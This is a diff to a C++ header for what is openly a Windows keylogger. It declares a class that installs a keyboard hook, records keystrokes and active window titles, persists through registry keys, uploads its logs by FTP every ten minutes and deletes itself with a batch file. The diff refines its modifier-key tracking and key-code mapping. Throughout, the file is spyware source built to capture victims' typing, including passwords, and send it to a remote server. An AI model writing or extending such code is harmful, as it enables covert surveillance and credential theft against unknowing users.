@@ -1,6 +1,11 @@
 #ifndef H_KEYLOGGER
 #define H_KEYLOGGER
 
+/*
+ASCII code: http://www.ascii-code.com/
+Virtual Key codes: http://msdn.microsoft.com/en-us/library/ms927178.aspx
+*/
+
 //will activate FTP upload functionality, which needs SFML. Comment out for a full standalone version without FTP upload
 #define USE_FTP
 
@@ -16,6 +21,7 @@
 #include <fstream>
 #include <string>
 #include <sstream>
+#include <map>
 
 #ifdef USE_FTP
 #include <SFML/Network.hpp>
@@ -27,26 +33,11 @@
 #define REGKEY_PERSIST "keylogger"
 #define REGKEY_LIFETIME "lifespan"
 
-//keyboard scan codes
-#define SC_CTRL 29
-#define SC_LSHIFT 42
-#define SC_ALT 56
-#define SC_RSHIFT 54
-#define SC_SPACE 57
-#define SC_ENTER 28
-#define SC_TAB 15
-#define SC_BACKSPACE 14
-#define SC_CAPSLOCK 58
-#define SC_ESCAPE 1
-
-//key to press in order to destroy the keylogger
-#define HOTKEY_PURGE NULL
-
 //data folder name
 #define DATADIR "data"
 
 //time interval between server uploads
-#define UPLOAD_DELTA 60
+#define UPLOAD_DELTA 600
 
 //name of the batch file used for deleting the program
 #define BATCH_NAME "cleaner.bat"
@@ -80,13 +71,21 @@ class KeyLogger {
     //get user home directory
     std::string getUserHomeDirectory();
 
-    //ALT state
-    bool KeyLogger::isAltDown() { return altDown; }
-    void KeyLogger::setAltDown(bool down) { altDown = down; }
+    //LEFT ALT state
+    bool KeyLogger::isLAltDown() { return laltDown; }
+    void KeyLogger::setLAltDown(bool down) { laltDown = down; }
 
-    //CTRL state
-    bool KeyLogger::isCtrlDown() { return ctrlDown; }
-    void KeyLogger::setCtrlDown(bool down) { ctrlDown = down; }
+    //RIGHT ALT state
+    bool KeyLogger::isRAltDown() { return raltDown; }
+    void KeyLogger::setRAltDown(bool down) { raltDown = down; }
+
+    //LEFT CTRL state
+    bool KeyLogger::isLCtrlDown() { return lctrlDown; }
+    void KeyLogger::setLCtrlDown(bool down) { lctrlDown = down; }
+
+    //RIGHT CTRL state
+    bool KeyLogger::isRCtrlDown() { return rctrlDown; }
+    void KeyLogger::setRCtrlDown(bool down) { rctrlDown = down; }
 
     //LEFT SHIFT state
     bool KeyLogger::isLShiftDown() { return lshiftDown; }
@@ -102,6 +101,8 @@ class KeyLogger {
     ~KeyLogger();
 
     void log(std::string text);
+   
+    void log(int vkCode);
 
     void removeSelf();
 
@@ -125,10 +126,16 @@ class KeyLogger {
 
     static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);
 
+    void mapKeys();
+
+    std::string keycodeToString(int keyCode);
+
     static KeyLogger* instance;
 
-    bool altDown;
-    bool ctrlDown;
+    bool laltDown;
+    bool raltDown;
+    bool lctrlDown;
+    bool rctrlDown;
     bool lshiftDown;
     bool rshiftDown;
 
@@ -145,6 +152,9 @@ class KeyLogger {
     std::string activeWindowTitle;
    
     std::string hostname;
+    
+    std::map<int, char> kbdToAscii;
+    std::map<int, std::string> specialKeys;
 
     #ifdef USE_FTP
     time_t lastUpload;
